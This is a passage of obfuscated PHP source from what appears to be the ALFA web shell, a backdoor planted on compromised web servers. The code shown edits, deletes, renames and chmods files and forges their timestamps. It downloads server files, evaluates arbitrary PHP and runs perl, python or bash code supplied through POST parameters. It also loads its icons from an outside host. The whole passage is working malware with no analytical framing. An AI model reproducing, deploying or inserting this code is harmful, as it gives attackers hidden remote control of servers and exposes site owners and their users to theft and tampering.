$cnspfppq6f8f57715090da2632453988d9a1501b = array('Chmod', 'Rename', 'Touch');
$yvdtggga39bb421562d6f6128a957f3d162538d2 = "dir";
}
echo('<div>');
foreach($cnspfppq6f8f57715090da2632453988d9a1501b as $hvlrcxnj9e3669d19b675bd57058fd4664205d2a)
echo $hvlrcxnj9e3669d19b675bd57058fd4664205d2a == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($pjsnqejl3707515996ae70bff801cd4bce3d80e2)?$_POST['alfa1']:$pjsnqejl3707515996ae70bff801cd4bce3d80e2).'\',\''.strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\'):\'\';"><span class="editor_actions">'.((strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$hvlrcxnj9e3669d19b675bd57058fd4664205d2a.' </span> </b>':$hvlrcxnj9e3669d19b675bd57058fd4664205d2a).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($pjsnqejl3707515996ae70bff801cd4bce3d80e2)?$_POST['alfa1']:$pjsnqejl3707515996ae70bff801cd4bce3d80e2).'\',\''.strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\')"><span class="editor_actions">'.((strtolower($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$hvlrcxnj9e3669d19b675bd57058fd4664205d2a.' </span> </b>':$hvlrcxnj9e3669d19b675bd57058fd4664205d2a).' | </span></a>';
echo '</div>';
switch($_POST['alfa2']){
case 'view':case 'edit':
@chdir($_POST['c']);
$wkcmtcid7d8ddf7625eb9c8d36668cd8c394a7af = "";
if(!@is_writable($_POST['alfa1'])&&!_alfa_is_writable($_POST['alfa1'])){
$wkcmtcid7d8ddf7625eb9c8d36668cd8c394a7af = "disabled=disabled";
$lczrrili2aed9dafbee823ceb8d8a93b93362da3= 'background: #ff0000;color: #fff;';
}
if(!empty($_POST['alfa3'])){
$_POST['alfa3'] = substr($_POST['alfa3'],1);
$ouidxbfr07cc694b9b3fc636710fa08b6922c42b = @filemtime($_POST['alfa1']);
$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @__write_file($_POST['alfa1'],$_POST['alfa3']);
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
	$bqrminekc626d8954194dd0136691c301dcf7ece = $qdtibsqye1811c0c73fb371dc3b92d7bbabfc584;
	$nljvfvfm1169f7b37065619357fee6e3b71c8376 = $bqrminekc626d8954194dd0136691c301dcf7ece.rand(111,9999);
	$rabzzsbu6a2a431fe8b621037ea949531c28551d = dirname($_SERVER["SCRIPT_FILENAME"])."/".$nljvfvfm1169f7b37065619357fee6e3b71c8376;
	if($zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @__write_file($rabzzsbu6a2a431fe8b621037ea949531c28551d ,$_POST['alfa3'])){
		alfaEx("mv '".addslashes($rabzzsbu6a2a431fe8b621037ea949531c28551d)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($rabzzsbu6a2a431fe8b621037ea949531c28551d)."'");
	}
}
if($zngnwtjj0666f0acdeed38d4cd9084ade1739498){
echo 'Saved!<br>';
@touch($_POST['alfa1'],$ouidxbfr07cc694b9b3fc636710fa08b6922c42b,$ouidxbfr07cc694b9b3fc636710fa08b6922c42b);
}
}
echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._alfa_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="alfaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = alfa_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$lczrrili2aed9dafbee823ceb8d8a93b93362da3.'" '.$wkcmtcid7d8ddf7625eb9c8d36668cd8c394a7af.'>save</button></div><pre class="ml1 view_ml_content">';
echo htmlspecialchars(__read_file($_POST['alfa1']));
echo '</pre></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
if(@is_readable($_POST['alfa1'])){
echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
$nndigmblc13367945d5d4c91047b3b50234aa7ab = @highlight_file($_POST['alfa1'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$nndigmblc13367945d5d4c91047b3b50234aa7ab).'</div></div></div>';
}
break;
case 'delete':
@chdir($_POST['c']);
if(@is_writable($_POST['alfa1'])||$GLOBALS["glob_chdir_false"]){
$jpylscqwda602f0b162fccbf6b150cfcfc7a7379 = true;
if(!@unlink($_POST['alfa1'])){
	$jpylscqwda602f0b162fccbf6b150cfcfc7a7379 = false;
	if($mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
		if(_alfa_is_writable($_POST['alfa1'])){
			alfaEx("rm -f '".addslashes($_POST['alfa1'])."'");
			$jpylscqwda602f0b162fccbf6b150cfcfc7a7379 = true;
		}
	}
}
if($jpylscqwda602f0b162fccbf6b150cfcfc7a7379)echo 'File Deleted...<script>var elem = $("'.$_POST['alfa4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['alfa4'].'"];</script>';else echo 'Error...';}
break;
case 'chmod':
@chdir($_POST['c']);
if(!empty($_POST['alfa3'])){
$xyksvzrf58f57b98cc8cfb81907179e9b4635762 = 0;
for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=strlen($_POST['alfa3'])-1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741>=0;--$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741)
$xyksvzrf58f57b98cc8cfb81907179e9b4635762 += (int)$_POST['alfa3'][$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]*pow(8, (strlen($_POST['alfa3'])-$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741-1));
if(!@chmod($_POST['alfa1'], $xyksvzrf58f57b98cc8cfb81907179e9b4635762)){
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
alfaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['alfa3'])." '".addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)."'");
echo('Success!');
}else{
echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
AlfaNum(8,9,10,7,6,5,4,2,1);
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
	$jldneloy4ac335b84cbc6e1bce3868e38065f567 = $hpqpacum080505fba0c91df9d7cff41d972acaf1[5];
}else{
	$jldneloy4ac335b84cbc6e1bce3868e38065f567 = substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
}
echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;"><input type="text" name="chmod" value="'.$jldneloy4ac335b84cbc6e1bce3868e38065f567.'"><input type=submit value=" "></form>';
break;
case 'hexdump':
@chdir($_POST['c']);
$yyphbkaj4a8a08f09d37b73795649038408b5f33 = __read_file($_POST['alfa1']);
$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = 0;
$cvnwfemf2510c39011c5be704182423e3a695e91 = array('00000000<br>','','');
$qfmncdsof5a8e923f8cd24b56b3bab32358cc58a = strlen($yyphbkaj4a8a08f09d37b73795649038408b5f33);
for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$qfmncdsof5a8e923f8cd24b56b3bab32358cc58a; ++$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741) {
$cvnwfemf2510c39011c5be704182423e3a695e91[1] .= sprintf('%02X',ord($yyphbkaj4a8a08f09d37b73795649038408b5f33[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741])).' ';
switch ( ord($yyphbkaj4a8a08f09d37b73795649038408b5f33[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]) ) {
case 0: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
case 9: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
case 10: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
case 13: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
default: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= $yyphbkaj4a8a08f09d37b73795649038408b5f33[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]; break;
}
$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1++;
if ($qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 == 32) {
$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = 0;
if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741+1 < $qfmncdsof5a8e923f8cd24b56b3bab32358cc58a) {$cvnwfemf2510c39011c5be704182423e3a695e91[0] .= sprintf('%08X',$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741+1).'<br>';}
$cvnwfemf2510c39011c5be704182423e3a695e91[1] .= '<br>';
$cvnwfemf2510c39011c5be704182423e3a695e91[2] .= "\n";
}
}
echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$cvnwfemf2510c39011c5be704182423e3a695e91[0].'</pre></span></td><td bgcolor=#282828><pre>'.$cvnwfemf2510c39011c5be704182423e3a695e91[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($cvnwfemf2510c39011c5be704182423e3a695e91[2]).'</pre></td></tr></table></div></div>';
break;
case 'rename':
@chdir($_POST['c']);
$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($_POST["alfa1"]);
$nsaqznrb95afd2e2e53938fe3786049402e4e518 = addslashes($_POST["alfa3"]);
if(!empty($_POST['alfa3'])){
$cttyjrbbaca66cb949843e056d7268641b9b74cc = false;
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
if(_alfa_is_writable($_POST['alfa1'])){
$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584);
alfaEx("cd '".addslashes($_POST['c'])."';mv '".$ykfrrysfb3101d8ff211f7523e7c281757437a55."' '".addslashes($_POST['alfa3'])."'");
}else{
$cttyjrbbaca66cb949843e056d7268641b9b74cc = true;
}
}else{
$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($_POST["alfa1"]);
}
if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cttyjrbbaca66cb949843e056d7268641b9b74cc){
echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'";updateFileEditor("'.$ykfrrysfb3101d8ff211f7523e7c281757437a55.'", "'.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'");'.($yvdtggga39bb421562d6f6128a957f3d162538d2 == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$ykfrrysfb3101d8ff211f7523e7c281757437a55."');":"").'}catch(e){console.log(e)}</script>');$ykfrrysfb3101d8ff211f7523e7c281757437a55 = $nsaqznrb95afd2e2e53938fe3786049402e4e518;}
}
echo '<form onsubmit="editor(\''.$ykfrrysfb3101d8ff211f7523e7c281757437a55.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)).'"><input type=submit value=" "></form>';
break;
case 'touch':
@chdir($_POST['c']);
if( !empty($_POST['alfa3']) ) {
$ouidxbfr07cc694b9b3fc636710fa08b6922c42b = strtotime($_POST['alfa3']);
if($ouidxbfr07cc694b9b3fc636710fa08b6922c42b){
$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = false;
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
	alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa3']))."' '".addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)."'");
	$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = true;
}
if(!@touch($_POST['alfa1'],$ouidxbfr07cc694b9b3fc636710fa08b6922c42b,$ouidxbfr07cc694b9b3fc636710fa08b6922c42b)&&!$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96)
echo 'Fail!';
else
echo 'Touched!';
} else echo 'Bad time format!';
}
clearstatcache();
echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772?$hpqpacum080505fba0c91df9d7cff41d972acaf1[4]:@filemtime($_POST['alfa1']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa1'];
$mdytkcgm4e84c247e9be8c08d521b216b1161ac9 = @getimagesize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
if(is_array($mdytkcgm4e84c247e9be8c08d521b216b1161ac9)||$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc = (int)$mdytkcgm4e84c247e9be8c08d521b216b1161ac9[0];
$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81 = (int)$mdytkcgm4e84c247e9be8c08d521b216b1161ac9[1];
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = alfaEx("cat '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."' | base64");
	list($krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc, $txtdplwpb435e227d5dd201e1768b2bcb2e0aa81) = explode(":", alfaEx("identify -format '%w:%h' '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'"));
	$allbrbted02a169f33469c888396a24dd9d9f1c6 = explode(":", alfaEx("file --mime-type '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'"));
	$mdytkcgm4e84c247e9be8c08d521b216b1161ac9['mime'] = $allbrbted02a169f33469c888396a24dd9d9f1c6[1];
}else{
	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = __ZW5jb2Rlcg(__read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, false));
}
$gbacnlfd9c91d71dd82f2db73fd3d48ad70689f4 = "Image type = <span>[</span> ".$mdytkcgm4e84c247e9be8c08d521b216b1161ac9['mime']." <span>]</span><br>Image Size = <span>[ </span>".$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc." x ".$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81."<span> ]</span><br>";
if($krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc > 800){$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc = 800;}
echo $mveevork9a0364b9e99bb480dd25e1f0284c8555 = "<div class='editor-view'><div class='view-content'><center>".$gbacnlfd9c91d71dd82f2db73fd3d48ad70689f4."<br><img id='viewImage' style='max-width:100%;border:1px solid green;' src='data:".$mdytkcgm4e84c247e9be8c08d521b216b1161ac9['mime'].";base64,".$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb."' alt='".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac."'></center></div></div><br>";
}
break;
}
echo '</div>';
alfaFooter();
}
function findicon($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a){
$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = 'http://solevisible.com/icons/';
$cucabfuhd14a8022b085f9ef19d479cbdd581127 = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a!='file'){
return ($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=='..'?$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'back.png':$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'folder.png');
}else{
$uzehrcsaabf77184f55403d75b9d51d79162a7ca = explode('.',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
$uzehrcsaabf77184f55403d75b9d51d79162a7ca = end($uzehrcsaabf77184f55403d75b9d51d79162a7ca);
$uzehrcsaabf77184f55403d75b9d51d79162a7ca = strtolower($uzehrcsaabf77184f55403d75b9d51d79162a7ca);
return (in_array($uzehrcsaabf77184f55403d75b9d51d79162a7ca,$cucabfuhd14a8022b085f9ef19d479cbdd581127)?$fwekvgvg03c7c0ace395d80182db07ae2c30f034.$uzehrcsaabf77184f55403d75b9d51d79162a7ca.'.png':$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'notfound.png');
}
}
function alfadlfile(){
if(isset($_POST['c'],$_POST['file'])){
$reppeyoy954eb83bca864c64ee1e669dfab01c95 = rawurldecode(basename($_POST['file']));
$_POST['file'] = str_replace("//", "/", $_POST['c'].'/'.$reppeyoy954eb83bca864c64ee1e669dfab01c95);
$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
ob_start("ob_gzhandler", 4096);
header("Content-Disposition: attachment; filename=\"".addslashes($reppeyoy954eb83bca864c64ee1e669dfab01c95)."\"");
header("Content-Type: application/octet-stream");
if($GLOBALS["glob_chdir_false"]){
	$nljvfvfm1169f7b37065619357fee6e3b71c8376 = $reppeyoy954eb83bca864c64ee1e669dfab01c95.rand(111,9999);
	$ajwomwbr060f3f7c2a71bb4afa792e03af1ab106 = dirname($_SERVER["SCRIPT_FILENAME"]);
	$rabzzsbu6a2a431fe8b621037ea949531c28551d = $ajwomwbr060f3f7c2a71bb4afa792e03af1ab106."/".$nljvfvfm1169f7b37065619357fee6e3b71c8376;
	if(_alfa_is_writable($ajwomwbr060f3f7c2a71bb4afa792e03af1ab106)){
		alfaEx("cp '".addslashes($_POST["file"])."' '".addslashes($rabzzsbu6a2a431fe8b621037ea949531c28551d)."'");
		readfile($rabzzsbu6a2a431fe8b621037ea949531c28551d);
		@unlink($rabzzsbu6a2a431fe8b621037ea949531c28551d);
	}else{
		alfaEx("cat '".addslashes($_POST["file"])."'");
	}
}else{
	readfile($_POST['file']);
}
}else echo('Error...!');}}
function __alfa_set_cookie($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
	$_COOKIE[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
	@setcookie($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804, time()+(86400 * 7), '/');
}
function alfaphpeval(){
if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
	$htevsqbb739d36023175752110e878e3b5872b5e = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
}else{
	$htevsqbb739d36023175752110e878e3b5872b5e = dirname(alfaEx("mktemp"));
	__alfa_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($htevsqbb739d36023175752110e878e3b5872b5e));
}
alfahead();
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'ini')){
echo '<div class=header>';
ob_start();
$mvghszwj19cf3bd8d7d38ff28b25e78c190c6262=ini_get_all();
print '<table border=0><tr>'
.'<td class="listing"><font class="highlight_txt">Param</td>'
.'<td class="listing"><font class="highlight_txt">Global value</td>'
.'<td class="listing"><font class="highlight_txt">Local Value</td>'
.'<td class="listing"><font class="highlight_txt">Access</td></tr>';
foreach ($mvghszwj19cf3bd8d7d38ff28b25e78c190c6262 as $noknfouyeca07335a33c5aeb5e1bc7c98b4b9d80 => $pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c)
print "\n".'<tr>'
.'<td class="listing"><b>'.$noknfouyeca07335a33c5aeb5e1bc7c98b4b9d80.'</td>'
.'<td class="listing">'.$pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c['global_value'].' </td>'
.'<td class="listing">'.$pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c['local_value'].' </td>'
.'<td class="listing">'.$pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c['access'].' </td></tr>';
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = ob_get_clean();
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
echo str_replace('<h1','<h2', $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef) .'</div><br>';
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'info')) {
echo '<div class=header><style>.p {color:#000;}</style>';
ob_start();
phpinfo();
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = ob_get_clean();
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
echo str_replace('<h1','<h2', $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef) .'</div><br>';
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'exten')) {
echo '<div class=header>';
ob_start();
$gtxoqfnhefd472d9664cd3e8c9e924f35e3f6c88=get_loaded_extensions();
echo '<table border=0><tr><td class="listing">'.implode('</td></tr>'."\n".'<tr><td class="listing">', $gtxoqfnhefd472d9664cd3e8c9e924f35e3f6c88).'</td></tr></table>'.count($gtxoqfnhefd472d9664cd3e8c9e924f35e3f6c88).' extensions loaded';
echo '</div><br>';
}
$cuxzaetv30eb9e5bb6316207d37cf1de8f3353a6 = "";
foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){$cuxzaetv30eb9e5bb6316207d37cf1de8f3353a6 .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($_POST["alfa3"]==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?"selected":"").'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';}
echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$cuxzaetv30eb9e5bb6316207d37cf1de8f3353a6.'</select>'._alfa_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):"&lt;?php\n\n\techo('hello alfa !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
echo '</form><pre id="PhpOutput" style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class="ml1">';
if(!empty($_POST['alfa1'])){
if($_POST['alfa3']=="php"){
ob_start();
eval('?>'.$_POST['alfa1']);
$nmxeqhvab4a88417b3d0170d754c647c30b7216a = htmlspecialchars(ob_get_clean());
}elseif(_alfa_can_runCommand()&&$GLOBALS["sys"]=="unix"){
	$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_POST['alfa3'];
	$ydojshxa435ed7e9f07f740abf511a62c00eef6e = "temp".rand(11111,99999);
	$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = $htevsqbb739d36023175752110e878e3b5872b5e."/".$ydojshxa435ed7e9f07f740abf511a62c00eef6e ;
	__write_file($ydojshxa435ed7e9f07f740abf511a62c00eef6e, $_POST['alfa1']);
	$nmxeqhvab4a88417b3d0170d754c647c30b7216a = alfaEx("mv {$ydojshxa435ed7e9f07f740abf511a62c00eef6e} {$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f};{$phbpyamz7572559ca86e781ba8fe8073a0b725c6} {$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f};rm -f {$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f}");
	@unlink($ydojshxa435ed7e9f07f740abf511a62c00eef6e);
	@unlink($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);
}
echo '<textarea class="bigarea">'.$nmxeqhvab4a88417b3d0170d754c647c30b7216a.'</textarea>';
}
echo '</pre></div>';
alfafooter();
}
function alfahash(){
if(!function_exists('hex2bin')) {function hex2bin($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {return decbin(hexdec($fxuvmwpb83878c91171338902e0fe0fb97a8c47a));}}
if(!function_exists('full_urlencode')) {function full_urlencode($fxuvmwpb83878c91171338902e0fe0fb97a8c47a){$yxarqqmp4b43b0aee35624cd95b910189b3dc231='';for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<strlen($fxuvmwpb83878c91171338902e0fe0fb97a8c47a);++$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741)$yxarqqmp4b43b0aee35624cd95b910189b3dc231.= '%'.dechex(ord($fxuvmwpb83878c91171338902e0fe0fb97a8c47a[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]));return strtoupper($yxarqqmp4b43b0aee35624cd95b910189b3dc231);}}
$adqpxutw8808d58642e6f03be4b9ea079b599994 = array(
'Base64_encode ( $string )' => '__ZW5jb2Rlcg($s)',
'Base64_decode ( $string )' => '__ZGVjb2Rlcg($s)',
'strrev ( $string )' => 'strrev($s)',
'bin2hex ( $string )' => 'bin2hex($s)',
'hex2bin ( $string )' => 'hex2bin($s)',
'md5 ( $string )' => 'md5($s)',
'sha1 ( $string )' => 'sha1($s)',
'hash ( "sha251", $string ) --> sha251' => 'hash("sha256",$s)',
'hash ( "sha384", $string ) --> sha384' => 'hash("sha384",$s)',
'hash ( "sha512", $string ) --> sha512' => 'hash("sha512",$s)',
'crypt ( $string )' => 'crypt($s)',
'crc32 ( $string )' => 'crc32($s)',
'str_rot13 ( $string )' => 'str_rot13($s)',
'urlencode ( $string )' => 'urlencode($s)',
